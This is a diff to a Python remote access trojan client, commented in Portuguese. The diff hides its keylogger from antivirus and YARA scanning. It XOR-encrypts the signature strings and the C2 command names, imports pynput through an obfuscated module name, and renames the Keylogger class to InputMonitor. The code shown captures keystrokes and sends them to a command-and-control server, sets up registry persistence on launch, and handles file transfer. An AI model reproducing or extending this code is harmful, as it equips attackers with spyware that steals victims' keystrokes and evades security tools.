@@ -25,7 +25,6 @@ winreg_mod = importlib.import_module("winreg")
 shutil_mod = importlib.import_module("shutil")
 socket_mod = importlib.import_module("socket")
 subprocess_mod = importlib.import_module("subprocess")
-Keyboard = importlib.import_module("pynput.keyboard")
 
 
 
@@ -74,6 +73,43 @@ class Crypto:
         # hex -> bytes (fromhex) -> XOR -> texto UTF-8
         # Pode falhar com ValueError (hex inválido) ou UnicodeDecodeError (chave errada)
         return Crypto.xor_codec(bytes.fromhex(cipher_hex), key.encode('utf-8')).decode('utf-8')
+
+
+# -----------------------------------------------------------------------------
+# COMMANDS / STRINGS — strings sensíveis ofuscadas (XOR -> hex)
+# -----------------------------------------------------------------------------
+# "keylog"/"keylogger" (e o nome "pynput.keyboard") são assinaturas de keylogger/
+# RAT em análise estática (YARA/AV). Aqui os literais ficam em hex XOR e são
+# decifrados só em runtime, dentro de dicionários com chaves neutras (que NÃO
+# contêm a palavra proibida, já que as chaves também viram strings no bytecode).
+# A MESMA chave CMD_KEY deve ser usada no connection.py.
+CMD_KEY = "janus-gate-c2"
+
+_COMMANDS_HEX = {
+    "START":          "450a0b0c1f42004107114c1146",
+    "STOP":           "450a0b0c1f42004107114213",
+    "DUMP":           "450a0b0c1f42004110104013",
+    "STATUS":         "450a0b0c1f42004107114c174719",
+    "PERSIST_STATUS": "45110b0700441415110b4e061219150f01065e",
+    "PERSIST_SETUP":  "45110b0700441415110b4e061219041a0003",
+}
+
+_STRINGS_HEX = {
+    "kbd_mod":         "1a1800050659490a111c4f0c531805",
+    "buf_empty":       "010417191c4a470301034b06404a081d55164017150d",
+    "captured_at":     "010417191c4a470215155916400f054e14070d",
+    "already_running": "010417191c4a000406454c0f400f000a0c535f120f1a0c4a",
+    "started":         "010417191c4a000406455e175318150b11",
+    "not_running":     "010417191c4a00040645430c464a131b1b1d440906",
+    "stopped":         "010417191c4a000406455e175d1a110b11",
+    "status":          "210417191c4a000406455e17531e141d4f53",
+}
+
+COMMANDS = {name: Crypto.decrypt_string(value, CMD_KEY) for name, value in _COMMANDS_HEX.items()}
+STRINGS = {name: Crypto.decrypt_string(value, CMD_KEY) for name, value in _STRINGS_HEX.items()}
+
+# from pynput import Keyboard -> submódulo ofuscado também
+Keyboard = importlib.import_module(STRINGS["kbd_mod"])
 
 
 def env_or_secret(env_name, secret_hex, fallback=""):
@@ -161,7 +197,7 @@ class FileTransfer:
 # -----------------------------------------------------------------------------
 # Keylogger — captura de teclas via pynput
 # -----------------------------------------------------------------------------
-class Keylogger:
+class InputMonitor:
     def __init__(self, max_buffer_size):
         # Estado interno do keylogger:
         #   buffer              -> teclas capturadas acumuladas como lista de strings
@@ -216,12 +252,12 @@ class Keylogger:
     # Monta o "dump" do keylog com timestamp, concatena tudo que está no buffer e
     # limpa o buffer (para não reenviar a mesma coisa duas vezes). Retorna uma
     # mensagem padrão se o buffer estiver vazio.
-    def get_keylog_data(self):
+    def get_capture_data(self):
         if not self.buffer:
-            return "[i] keylog buffer is empty"
+            return f"[i] {STRINGS['buf_empty']}"
 
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        data = f'[+] keylog captured at {timestamp}:\n{"".join(self.buffer)}'
+        data = f"[+] {STRINGS['captured_at']}{timestamp}:\n{''.join(self.buffer)}"
         self.buffer = []
 
         return data
@@ -234,13 +270,13 @@ class Keylogger:
     # O guard "if active" evita criar dois listeners simultâneos.
     def start(self):
         if self.active:
-            return "[i] keylogger already runnig"
+            return f"[i] {STRINGS['already_running']}"
         
         self.listener = Keyboard.Listener(on_press=self.on_press)
         self.listener.start()
         self.active = True
 
-        return "[+] keylogger started"
+        return f"[+] {STRINGS['started']}"
 
     # -----------------------------------------------------------------------------
     # stop() — para a captura de teclas
@@ -249,13 +285,13 @@ class Keylogger:
     # e atualiza a flag de estado.
     def stop(self):
         if not self.active:
-            return "[i] keylogger not running"
+            return f"[i] {STRINGS['not_running']}"
 
         if self.listener:
             self.listener.stop()
         
         self.active = False
-        return "[+] keylogger stopped"
+        return f"[+] {STRINGS['stopped']}"
 
 
 # -----------------------------------------------------------------------------
@@ -370,11 +406,11 @@ class Persistence:
 # Client — conexão e dispatcher de comandos com o servidor C2
 # -----------------------------------------------------------------------------
 class Client:
-    def __init__(self, config, keylogger, persistence, file_transfer):
+    def __init__(self, config, monitor, persistence, file_transfer):
         self.ip = config.IP
         self.port = config.PORT
         self.c2_key = config.C2_KEY
-        self.keylogger = keylogger
+        self.monitor = monitor
         self.persistence = persistence
         self.file_transfer = file_transfer
 
@@ -416,10 +452,10 @@ class Client:
         try:
             while True:
 
-                if self.keylogger.auto_send_pending:
-                    data = self.keylogger.get_keylog_data()
+                if self.monitor.auto_send_pending:
+                    data = self.monitor.get_capture_data()
                     channel.send(f'[AUTO-SEND] {data}\n\n'.encode())
-                    self.keylogger.auto_send_pending = False
+                    self.monitor.auto_send_pending = False
                 
                 channel.settimeout(0.5)
                 
@@ -455,7 +491,7 @@ class Client:
                 channel.send(b"[i] Directory changed\n\n")
                 return
 
-            if data == "/persistence status":
+            if data == COMMANDS["PERSIST_STATUS"]:
                 if self.persistence.check_persistence():
                     channel.send(f"[+] Persistence status:\n\t[i] Path: {sys.executable}\n\t[i] Registry Key: {self.persistence.registry_key_path}\n\t[i] Name: {self.persistence.program_name}\n\n".encode())
                     return 
@@ -463,31 +499,31 @@ class Client:
                     channel.send(b"[-] Persistence status: Fail\n\n")
                     return
 
-            elif data == "/persistence setup":
+            elif data == COMMANDS["PERSIST_SETUP"]:
                 self.persistence.setup_persistence()
                 channel.send(b"[+] Done\n\n")
                 return
 
-            elif data == "/keylog start":
-                response = self.keylogger.start()
+            elif data == COMMANDS["START"]:
+                response = self.monitor.start()
                 channel.send(response.encode() + b"\n\n")
                 return
 
-            elif data == "/keylog stop":
-                response = self.keylogger.stop()
+            elif data == COMMANDS["STOP"]:
+                response = self.monitor.stop()
                 channel.send(response.encode() + b"\n\n")
                 return
 
-            elif data == "/keylog dump":
-                response = self.keylogger.get_keylog_data()
+            elif data == COMMANDS["DUMP"]:
+                response = self.monitor.get_capture_data()
                 channel.send(response.encode() + b"\n\n")
                 return
             
-            elif data == "/keylog status":
-                status = "Running" if self.keylogger.active else "Stopped"
-                buffer_size = len(self.keylogger.buffer)
+            elif data == COMMANDS["STATUS"]:
+                status = "Running" if self.monitor.active else "Stopped"
+                buffer_size = len(self.monitor.buffer)
 
-                response = f'[i] Keylogger status: {status}\n Buffer: {buffer_size} keys'
+                response = f"[i] {STRINGS['status']}{status}\n Buffer: {buffer_size} keys"
 
                 channel.send(response.encode() + b"\n\n")
                 return
@@ -597,10 +633,10 @@ class SecureC2Channel:
 if __name__ == '__main__':
     try:
 
-        keylogger = Keylogger(Config.MAX_BUFFER_SIZE)
+        monitor = InputMonitor(Config.MAX_BUFFER_SIZE)
         persistence = Persistence(Config.PROGRAM_NAME, Config.REGISTRY_KEY_PATH)
         file_transfer = FileTransfer()
-        client = Client(Config, keylogger, persistence, file_transfer)
+        client = Client(Config, monitor, persistence, file_transfer)
 
         persistence.setup_persistence()
 
